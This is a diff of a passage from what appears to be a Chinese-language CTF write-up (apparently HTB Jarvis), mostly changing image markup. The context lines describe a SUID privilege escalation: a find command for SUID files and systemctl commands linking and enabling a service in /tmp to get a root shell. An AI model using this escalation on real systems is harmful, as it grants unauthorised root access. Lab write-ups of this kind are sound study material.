 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>systemctl有suid：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010713.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>利用方式：</p>
 <ul>
 <li>systemctl | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/systemctl/</a></li>
@@ -280,9 +371,23 @@
 
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl link /tmp/miao.service</span><br><span class="line">systemctl enable --now /tmp/miao.service</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010714.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010714.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>打到root shell，读取root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010715.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010715.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>systemctl | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/systemctl/</a></li>
 <li>HTB: Jarvis | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html</a></li>
